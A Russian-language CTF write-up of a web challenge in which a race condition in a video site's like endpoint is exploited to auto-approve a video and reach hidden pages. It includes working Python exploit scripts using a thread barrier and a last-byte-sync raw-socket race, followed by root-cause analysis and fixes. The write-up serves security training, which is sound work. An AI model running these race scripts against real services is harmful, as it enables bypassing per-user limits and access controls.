# Writeup: «HackerTube 2» (Web)

**Цель:** `http://62.173.140.174:16093`
**Категория:** Web
**Формат флага:** `CODEBY{...}`

## Описание задания

> Опять дискриминация?

Название прямо намекает на предыдущую часть задания ("HackerTube") и на тему **race condition** — в рунглише CTF-сленге "дискриминация" (race = гонка / расовая дискриминация) частая игра слов для обозначения уязвимостей класса *race condition*.

## 1. Разведка

Открываем главную страницу — простая видеоплатформа "HackerTube": список превью видео с количеством лайков, ссылки `Login` / `Register`.

```bash
curl -s http://62.173.140.174:16093/ | head -40
```

Заголовок ответа показывает, что бэкенд на Flask (Werkzeug dev-сервер):

```bash
curl -sI http://62.173.140.174:16093/
# Server: Werkzeug/3.1.5 Python/3.11.6
```

Проверка типовых путей ничего не дала (везде 404):

```bash
for p in robots.txt admin api flag debug .git/HEAD config; do
  echo -n "$p -> "
  curl -s -o /dev/null -w "%{http_code}\n" "http://62.173.140.174:16093/$p"
done
```

Клик по любому видео с главной страницы без авторизации отдаёт **500 Internal Server Error**, что уже подозрительно — похоже на необработанное исключение при попытке проверить владельца видео для анонимного пользователя.

## 2. Регистрация, авторизация и обзор функционала

```bash
curl -s -c cookies.txt -X POST http://62.173.140.174:16093/register \
  -d "username=testuser2&password=TestPass456!"

curl -s -b cookies.txt -c cookies.txt -X POST http://62.173.140.174:16093/login \
  -d "username=testuser2&password=TestPass456!"
```

После логина в навигации появляются пункты `Upload` и `My Videos`.

Пробуем открыть **чужое** видео (UUID взят с главной страницы) уже будучи авторизованными:

```bash
curl -s -b cookies.txt http://62.173.140.174:16093/video/a7db9e63-abd7-46bf-b968-11e09cebd1e5
```

```html
<title>403 Forbidden</title>
<p>You don't have the permission to access the requested resource...</p>
```

**Вывод:** просмотр видео жёстко привязан к владельцу — `abort(403)`, если `current_user != owner`. Всё нужное придётся получать через собственный аккаунт и собственный загруженный контент.

### Загрузка видео

```
GET /upload
```

Форма: `title` + `video` (multipart, до 10MB). Простой мусорный файл сервер не принимает — падает с 500 (похоже на необработанное исключение при генерации превью для невалидного видео). Нужен настоящий, декодируемый видеофайл.

Генерируем минимальный валидный `.mp4` через ffmpeg:

```bash
ffmpeg -y -f lavfi -i color=c=blue:s=64x64:d=1 -c:v libx264 -pix_fmt yuv420p -t 1 test.mp4
```

Загрузка:

```bash
curl -s -b cookies.txt -X POST http://62.173.140.174:16093/upload \
  -F "title=RaceTest1" \
  -F "video=@test.mp4;type=video/mp4"
```

Ответ (страница `My Videos`):

```
Video uploaded and awaiting approval
Status: On Moderation
Note: It takes 10 times fewer likes than last time
```

Ключевая подсказка: видео получает статус **On Moderation** и переходит в **Approved**, судя по всему, автоматически — после набора определённого числа лайков ("в этот раз порог в 10 раз ниже, чем в прошлый раз", отсылка к предыдущей части задания).

## 3. Механика лайков

На странице собственного видео есть форма:

```html
<form action="/like/<uuid>" method="post">
  <button type="submit" class="like-button">Like</button>
</form>
```

**Проверка №1** — лайкнуть **чужое** видео:

```bash
curl -s -b cookies.txt -X POST http://62.173.140.174:16093/like/a7db9e63-abd7-46bf-b968-11e09cebd1e5
# 403 Forbidden
```

Лайкать можно только собственное видео.

**Проверка №2** — лайкнуть своё видео дважды подряд:

```bash
curl -s -b cookies.txt -X POST http://62.173.140.174:16093/like/<video_id>
curl -s -b cookies.txt -X POST http://62.173.140.174:16093/like/<video_id>
```

Первый раз: `Likes: 1`. Второй раз: `You have already liked this video`, `Likes: 1` (без изменений).

**Вывод:** лайк можно поставить один-единственный раз, и только своему собственному видео. Легально набрать нужное количество лайков одним аккаунтом невозможно — если только проверка "уже лайкал?" не реализована с гонкой состояний (race condition).

## 4. Первая (неудачная) попытка гонки

Наивный тест через параллельные запросы из браузера (`Promise.all`, 50 одновременных `fetch`) на видео, которое уже было лайкнуто ранее — результата не дал:

```js
const id = 'c73661aa-7570-4d38-a8fd-1b43ad3a8730';
const promises = [];
for (let i = 0; i < 50; i++) promises.push(fetch('/like/' + id, { method: 'POST' }));
await Promise.all(promises);
// likes остались 1
```

Это закономерно: окно гонки уже было "закрыто" самым первым успешным лайком ещё до теста. Гонку нужно тестировать на **свежем**, ещё ни разу не лайкнутом видео, и делать это по-настоящему параллельно — через отдельные TCP-соединения, а не через `fetch()`-очередь браузера.

## 5. Рабочий тест гонки (threading + barrier)

Python-скрипт на `requests` + `threading.Barrier`, чтобы все потоки стартовали синхронно:

```python
import requests, threading, re, time

BASE = "http://62.173.140.174:16093"
OWNER_USER, OWNER_PASS = "testuser2", "TestPass456!"

owner = requests.Session()
owner.post(f"{BASE}/login", data={"username": OWNER_USER, "password": OWNER_PASS})

with open("test.mp4", "rb") as f:
    video_bytes = f.read()

files = {"video": ("test.mp4", video_bytes, "video/mp4")}
data = {"title": "RaceTest_" + str(int(time.time()))}
r = owner.post(f"{BASE}/upload", files=files, data=data)
video_id = re.search(r'/video/([a-f0-9-]{36})">' + re.escape(data["title"]), r.text).group(1)

N = 40
results = []
barrier = threading.Barrier(N)

def do_like():
    s = requests.Session()
    s.cookies.update(owner.cookies)
    barrier.wait()                       # синхронный старт всех потоков
    r = s.post(f"{BASE}/like/{video_id}")
    results.append((r.status_code, "already liked" in r.text))

threads = [threading.Thread(target=do_like) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

success = sum(1 for st, already in results if st == 200 and not already)
print("успешных лайков сверх нормы:", success)
```

Результат: **3 из 40** запросов одновременно прошли проверку "ещё не лайкал" и увеличили счётчик. Race condition подтверждена: проверка "уже лайкал?" и запись лайка не атомарны.

## 6. Усиление атаки — "last-byte sync" через сырые сокеты

Чтобы увеличить число реально одновременных запросов, применена классическая техника single-packet / last-byte race: заранее открываем `N` TCP-соединений, отправляем весь HTTP-запрос кроме последнего байта, и в самый последний момент "довыстреливаем" хвост всем сокетам почти синхронно — это минимизирует джиттер, вносимый очередью потоков и стеком `requests`.

```python
import socket, threading, time, re, requests
from collections import Counter

HOST, PORT = "62.173.140.174", 16093
BASE = f"http://{HOST}:{PORT}"

owner = requests.Session()
owner.post(f"{BASE}/login", data={"username": "testuser2", "password": "TestPass456!"})
cookie_header = "; ".join(f"{k}={v}" for k, v in owner.cookies.get_dict().items())

with open("test.mp4", "rb") as f:
    video_bytes = f.read()
files = {"video": ("test.mp4", video_bytes, "video/mp4")}
data = {"title": "SyncRace_" + str(int(time.time() * 1000))}
r = owner.post(f"{BASE}/upload", files=files, data=data)
video_id = re.search(r'/video/([a-f0-9-]{36})">' + re.escape(data["title"]), r.text).group(1)

path = f"/like/{video_id}"
head = (
    f"POST {path} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Cookie: {cookie_header}\r\n"
    f"Content-Length: 0\r\n"
    f"Connection: close\r\n"
    f"\r"          # последний \n намеренно не отправляем
).encode()
tail = b"\n"

N = 400
sockets = []
for _ in range(N):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(head)                      # запрос "почти" отправлен
    sockets.append(s)

def send_tail(s):
    s.sendall(tail)                      # финальный байт — все потоки разом

threads = [threading.Thread(target=send_tail, args=(s,)) for s in sockets]
for t in threads: t.start()
for t in threads: t.join()

def read_status(s):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    return data.split(b"\r\n", 1)[0].decode(errors="replace")

print(Counter(read_status(s) for s in sockets))

r = owner.get(f"{BASE}/video/{video_id}")
print("likes:", re.search(r"Likes:\s*(\d+)", r.text).group(1))
```

### Результаты по разным N (каждый прогон — новое, ещё не лайкнутое видео)

| N сокетов | Успешных лайков |
|---|---|
| 40 (threading, без sync) | 3 |
| 100 (last-byte sync) | 8 |
| 150 (повтор на том же видео) | 8 (без изменений — окно гонки уже закрыто) |
| 400 (last-byte sync) | **12** |
| 800 (last-byte sync) | 9 (часть соединений упала с ошибкой — сервер/ОС не выдержали такое число одновременных подключений) |

Важное наблюдение: повторная атака на **уже частично залайканное** видео роста не даёт — окно гонки открывается лишь один раз, в момент, когда флаг "лайк не стоит" ещё не записан ни в одном потоке. Поэтому для каждой попытки нужно свежее, ранее не лайканное видео. Оптимум оказался в районе 300–500 параллельных соединений — дальше сервер/локальная сеть начинают резать лишние подключения, эффективность атаки падает.

## 7. Успех

После того как одно из видео набрало 12 "гоночных" лайков, его статус в `My Videos` сменился на `Approved`:

```bash
curl -s -b cookies.txt http://62.173.140.174:16093/my_videos
# Status: Approved
```

И — важно — в навигации сайта появились два новых пункта, которых не было раньше:

```html
<a href="/moderate">Moderate</a>
<a href="/secret">Secret</a>
```

То есть одобрение (approve) хотя бы одного видео открывает пользователю доступ к скрытым разделам приложения:

```bash
curl -s -b cookies.txt http://62.173.140.174:16093/moderate
curl -s -b cookies.txt http://62.173.140.174:16093/secret
```

- `/moderate` — панель модерации со списком всех загруженных видео и кнопкой `Approve` для каждого.
- `/secret` — приватная страница, доступная только после того, как хотя бы одно ваше видео получило статус `Approved`. На ней находится флаг задания.

## Первопричина уязвимости

**Тип:** CWE-362 (Race Condition, TOCTOU — Time-Of-Check to Time-Of-Use) в обработчике `POST /like/<video_id>`.

Судя по поведению, серверный код выглядел примерно так (не атомарно):

```python
@app.route("/like/<video_id>", methods=["POST"])
@login_required
def like(video_id):
    video = get_video_or_403(video_id, owner=current_user)
    if current_user.id in video.likers:        # (1) ПРОВЕРКА
        flash("You have already liked this video")
    else:
        video.likers.add(current_user.id)       # (2) ЗАПИСЬ
        video.likes += 1
        maybe_auto_approve(video)
    return redirect(...)
```

Между шагом (1) и шагом (2) нет блокировки/атомарной транзакции. При десятках-сотнях параллельных запросов от одной сессии несколько потоков успевают пройти проверку "ещё не лайкал" до того, как первый из них зафиксирует отметку — счётчик лайков растёт сверх положенного 1 раза на пользователя.

Это позволило одному аккаунту накрутить собственному видео лайки, превысить порог автоодобрения (`On Moderation` → `Approved`) без участия реальных сторонних пользователей и получить доступ к скрытому функционалу (`/moderate`, `/secret`), недоступному обычным аккаунтам.

## Выводы / рекомендации по защите

1. **Атомарность операций "проверить-и-записать".** Любую последовательность вида "прочитать состояние → принять решение → изменить состояние" нужно оборачивать в транзакцию БД с соответствующим уровнем изоляции (`SELECT ... FOR UPDATE`), либо использовать атомарные операции на уровне СУБД (`UNIQUE`-constraint на пару `(user_id, video_id)` в таблице лайков + `INSERT ... ON CONFLICT DO NOTHING`), либо блокировку (mutex/advisory lock) на уровне ресурса.
2. **Не полагаться на in-memory флаги без синхронизации** при многопоточном/многопроцессном обслуживании запросов (Flask dev-сервер с `threaded=True`, gunicorn с несколькими воркерами и т.п.) — классическая ошибка, эксплуатируемая именно так, как показано выше.
3. **Ограничивать частоту действий не только по числу запросов, но и по параллелизму** — rate-limiting по количеству запросов в секунду не спасает от single-packet/last-byte атак, где решающим фактором является не скорость, а синхронность запросов.
4. **Не связывать чувствительный функционал (доступ к приватным разделам) напрямую с легко подделываемой метрикой** (например, количеством лайков) без дополнительной проверки целостности этой метрики.

---

